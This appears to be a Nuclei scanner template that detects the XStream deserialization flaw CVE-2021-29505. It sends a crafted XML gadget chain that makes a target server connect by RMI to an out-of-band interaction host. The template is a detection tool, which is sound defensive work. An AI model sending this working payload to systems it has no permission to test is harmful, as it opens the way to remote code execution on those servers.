id: CVE-2021-29505

info:
  name: XStream < 1.4.17  - Remote Code Execution
  author: pwnhxl
  severity: high
  description: |
    XStream is software for serializing Java objects to XML and back again. A vulnerability in XStream versions prior to 1.4.17 may allow a remote attacker has sufficient rights to execute commands of the host only by manipulating the processed input stream.
  reference:
    - https://paper.seebug.org/1543/
    - https://github.com/vulhub/vulhub/blob/master/xstream/CVE-2021-29505/README.zh-cn.md
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29505
    - https://github.com/x-stream/xstream/security/advisories/GHSA-7chv-rrw6-w6fc
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2021-29505
    cwe-id: CWE-94,CWE-502
  tags: oast,vulhub,cve,cve2021,xstream,deserialization,rce
requests:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <java.util.PriorityQueue serialization='custom'>
            <unserializable-parents/>
            <java.util.PriorityQueue>
                <default>
                    <size>2</size>
                </default>
                <int>3</int>
                <javax.naming.ldap.Rdn_-RdnEntry>
                    <type>12345</type>
                    <value class='com.sun.org.apache.xpath.internal.objects.XString'>
                        <m__obj class='string'>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content</m__obj>
                    </value>
                </javax.naming.ldap.Rdn_-RdnEntry>
                <javax.naming.ldap.Rdn_-RdnEntry>
                    <type>12345</type>
                    <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>
                        <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>
                            <parsedMessage>true</parsedMessage>
                            <soapVersion>SOAP_11</soapVersion>
                            <bodyParts/>
                            <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>
                                <attachmentsInitialized>false</attachmentsInitialized>
                                <nullIter class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>
                                    <aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'>
                                        <candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'>
                                            <names>
                                                <string>aa</string>
                                                <string>aa</string>
                                            </names>
                                            <ctx>
                                                <environment/>
                                                <registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'>
                                                    <java.rmi.server.RemoteObject>
                                                        <string>UnicastRef</string>
                                                        <string>{{interactsh-url}}</string>
                                                        <int>1099</int>
                                                        <long>0</long>
                                                        <int>0</int>
                                                        <long>0</long>
                                                        <short>0</short>
                                                        <boolean>false</boolean>
                                                    </java.rmi.server.RemoteObject>
                                                </registry>
                                                <host>{{interactsh-url}}</host>
                                                <port>1099</port>
                                            </ctx>
                                        </candidates>
                                    </aliases>
                                </nullIter>
                            </sm>
                        </message>
                    </value>
                </javax.naming.ldap.Rdn_-RdnEntry>
            </java.util.PriorityQueue>
        </java.util.PriorityQueue>

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"

      - type: word
        part: body
        words:
          - "timestamp"
          - "com.thoughtworks.xstream"
        condition: or

      - type: word
        part: header
        words:
          - "application/json"

      - type: status
        status:
          - 500
